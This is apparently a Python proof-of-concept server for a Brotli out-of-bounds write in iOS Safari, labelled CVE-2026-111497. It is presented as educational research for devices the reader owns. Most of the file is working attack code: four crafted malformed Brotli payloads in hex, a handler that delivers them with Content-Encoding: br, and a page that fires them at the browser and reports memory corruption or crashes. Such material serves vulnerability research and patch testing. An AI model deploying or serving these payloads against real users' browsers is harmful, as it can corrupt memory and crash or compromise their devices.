#!/usr/bin/env python3
"""CVE-2026-111497 Brotli OOB Write - iOS Safari Trigger Server.

Educational research only - for testing on devices you own.

Serves a landing page that fetches resources with Content-Encoding: br.
When Safari's WebKit.Networking processes the malformed Brotli stream,
the decoder hits the block-switch bug (DecodeBlockTypeAndLength returning
BROTLI_FALSE for format error, indistinguishable from "need more input").

The server returns crafted Brotli bytes that trigger the OOB write in the
ring buffer via stale Huffman tree pointers.

Usage:
    python3 brotli_trigger_server.py [port]
    # Then navigate iPad Safari to http://<mac-ip>:<port>/
"""

import http.server
import sys
import json
import time

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8889

# Malicious Brotli payloads from CVE-2026-111497 PoC
# These trigger DecodeBlockTypeAndLength() with an invalid block switch
# on a single-block-type stream. The decoder ignores the error on the
# fast path and continues with stale pointers -> OOB write.
PAYLOADS = {
    "oob-base":     bytes.fromhex("200010414141fcffff07002228f00b60f7f41f000000"),
    "oob-extended": bytes.fromhex("200010414141fcffff07002228f00b60f7f41f00000000"),
    "oob-huffman":  bytes.fromhex("200018414141fcffff07002228f00b60f7f41f000000"),
    "oob-padding":  bytes.fromhex("200010414141fcffff0f002228f00b60f7f41f000000"),
}

LANDING_PAGE = b"""\
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>CVE-2026-111497 Brotli Trigger</title>
<style>
body { font-family: -apple-system, system-ui, sans-serif; padding: 20px;
       background: #111; color: #eee; }
h1 { color: #f90; font-size: 1.3em; }
.status { margin: 10px 0; padding: 10px; border-radius: 6px; font-family: monospace; }
.pending { background: #333; }
.success { background: #1a3a1a; color: #6f6; }
.fail { background: #3a1a1a; color: #f66; }
.crash { background: #3a3a1a; color: #ff6; }
button { background: #f90; color: #000; border: none; padding: 12px 24px;
         border-radius: 6px; font-size: 16px; cursor: pointer; margin: 5px; }
button:active { background: #c70; }
#log { margin-top: 20px; font-family: monospace; font-size: 12px;
       white-space: pre-wrap; max-height: 300px; overflow-y: auto;
       background: #1a1a1a; padding: 10px; border-radius: 6px; }
</style>
</head>
<body>
<h1>CVE-2026-111497 Brotli OOB Write</h1>
<p>iOS Safari trigger - educational research on owned devices only.</p>
<p>Each button fetches a resource with <code>Content-Encoding: br</code>
containing a malformed Brotli stream. If the decoder is vulnerable,
it will continue past the invalid block switch and perform an OOB write.</p>

<div>
<button onclick="triggerOne('oob-base')">oob-base (22B)</button>
<button onclick="triggerOne('oob-extended')">oob-extended (23B)</button>
<button onclick="triggerOne('oob-huffman')">oob-huffman (22B)</button>
<button onclick="triggerOne('oob-padding')">oob-padding (22B)</button>
</div>
<div style="margin-top:10px">
<button onclick="triggerAll()" style="background:#f44">Fire ALL payloads</button>
<button onclick="triggerFetch()" style="background:#48f">fetch() method</button>
<button onclick="triggerXHR()" style="background:#84f">XHR method</button>
</div>

<div id="results"></div>
<div id="log"></div>

<script>
var results = {};
var logEl = document.getElementById('log');

function log(msg) {
  logEl.textContent += new Date().toISOString().slice(11,23) + ' ' + msg + '\\n';
  logEl.scrollTop = logEl.scrollHeight;
}

function showResult(name, status, detail) {
  results[name] = {status: status, detail: detail};
  var html = '';
  for (var k in results) {
    var r = results[k];
    var cls = r.status === 'pending' ? 'pending' :
              r.status === 'oob' ? 'fail' :
              r.status === 'patched' ? 'success' : 'crash';
    html += '<div class="status ' + cls + '">' + k + ': ' + r.detail + '</div>';
  }
  document.getElementById('results').innerHTML = html;
}

function triggerOne(name) {
  showResult(name, 'pending', 'fetching...');
  log('>>> ' + name + ' via fetch()');
  var t0 = performance.now();

  fetch('/trigger/' + name, {
    method: 'GET',
    headers: {'Accept': '*/*'}
  })
  .then(function(r) {
    var elapsed = (performance.now() - t0).toFixed(0);
    log('  HTTP ' + r.status + ' in ' + elapsed + 'ms');
    return r.text().then(function(body) {
      try {
        var j = JSON.parse(body);
        if (j.error === 'ERR__ERROR_FORMAT_BLOCK_SWITCH') {
          showResult(name, 'patched', 'PATCHED - blocked by error -17 (' + elapsed + 'ms)');
          log('  PATCHED: ' + j.error);
        } else {
          showResult(name, 'oob', 'OOB HIT - decoder continued past block switch (' + elapsed + 'ms) error=' + (j.error || '?'));
          log('  VULNERABLE: decoder error ' + (j.error || body.slice(0,100)));
        }
      } catch(e) {
        if (body.length > 0) {
          showResult(name, 'oob', 'Response received (' + body.length + 'B, ' + elapsed + 'ms) - decoder processed malformed stream');
          log('  RESPONSE: ' + body.slice(0, 200));
        } else {
          showResult(name, 'crash', 'Empty response (' + elapsed + 'ms) - possible crash');
          log('  EMPTY RESPONSE - possible process crash');
        }
      }
    });
  })
  .catch(function(e) {
    var elapsed = (performance.now() - t0).toFixed(0);
    showResult(name, 'crash', 'NETWORK ERROR (' + elapsed + 'ms): ' + e.message);
    log('  ERROR: ' + e.message);
  });
}

function triggerAll() {
  log('=== Firing all payloads ===');
  ['oob-base', 'oob-extended', 'oob-huffman', 'oob-padding'].forEach(function(name, i) {
    setTimeout(function() { triggerOne(name); }, i * 500);
  });
}

function triggerFetch() {
  log('=== fetch() with streaming ===');
  showResult('fetch-stream', 'pending', 'fetching oob-base via streaming...');
  fetch('/trigger/oob-base')
    .then(function(r) { return r.arrayBuffer(); })
    .then(function(buf) {
      var arr = new Uint8Array(buf);
      showResult('fetch-stream', 'oob', 'Got ' + arr.length + ' bytes - decoder processed stream');
      log('  ArrayBuffer: ' + arr.length + ' bytes, first=' + arr[0]);
    })
    .catch(function(e) {
      showResult('fetch-stream', 'crash', 'ERROR: ' + e.message);
      log('  fetch stream ERROR: ' + e.message);
    });
}

function triggerXHR() {
  log('=== XHR method ===');
  showResult('xhr', 'pending', 'sending via XMLHttpRequest...');
  var xhr = new XMLHttpRequest();
  xhr.open('GET', '/trigger/oob-base', true);
  xhr.onload = function() {
    showResult('xhr', 'oob', 'HTTP ' + xhr.status + ' - ' + xhr.responseText.slice(0,100));
    log('  XHR response: ' + xhr.status + ' ' + xhr.responseText.slice(0,100));
  };
  xhr.onerror = function() {
    showResult('xhr', 'crash', 'XHR error - possible crash');
    log('  XHR error');
  };
  xhr.send();
}
</script>
</body>
</html>
"""


class BrotliTriggerHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/' or self.path == '/index.html':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.send_header('Content-Length', str(len(LANDING_PAGE)))
            self.send_header('Cache-Control', 'no-store')
            self.end_headers()
            self.wfile.write(LANDING_PAGE)
            return

        if self.path.startswith('/trigger/'):
            name = self.path.split('/trigger/', 1)[1].split('?')[0]
            if name in PAYLOADS:
                payload = PAYLOADS[name]
                ts = time.strftime('%H:%M:%S')
                print(f"[{ts}] {self.client_address[0]} -> /trigger/{name} "
                      f"({len(payload)}B malformed br)")
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.send_header('Content-Encoding', 'br')
                self.send_header('Content-Length', str(len(payload)))
                self.send_header('Cache-Control', 'no-store')
                self.end_headers()
                self.wfile.write(payload)
                return

        self.send_response(404)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(b'not found')

    def log_message(self, fmt, *args):
        pass


def main():
    server = http.server.HTTPServer(('0.0.0.0', PORT), BrotliTriggerHandler)
    print(f"CVE-2026-111497 Brotli Trigger Server")
    print(f"  Listening on 0.0.0.0:{PORT}")
    print(f"  Payloads: {', '.join(PAYLOADS.keys())}")
    print(f"  Navigate iPad Safari to http://<mac-ip>:{PORT}/")
    print()
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nStopped.")


if __name__ == '__main__':
    main()
